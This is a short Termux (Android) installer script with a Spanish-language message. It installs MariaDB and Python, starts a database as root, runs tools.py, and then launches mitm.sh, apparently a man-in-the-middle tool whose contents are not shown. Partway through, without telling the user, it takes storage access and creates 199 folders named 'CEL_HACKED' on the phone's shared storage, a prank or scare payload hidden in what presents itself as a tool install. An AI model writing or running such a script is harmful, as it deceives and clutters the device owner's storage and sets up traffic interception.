
#!/bin/bash


apt update
apt upgrade
pkg install bash*
apt install mariadb
mkdir -p  /data/data/com.termux/files/usr/etc/my.cnf.d
mysql_install_db
mysqld_safe -u root &
apt install python*
pip install pybase64
chmod +x mitm.sh
chmod +x tools.py
python tools.py
clear
A=1
termux-setup-storage
cd /sdcard/
while [ $A -lt 200 ]
do
mkdir "CEL_HACKED $A"
let A++
done
clear
sleep 5
echo -e "Herramienta instalada se ejecutara en 5 segundos"
sleep 5
clear
bash mitm.sh

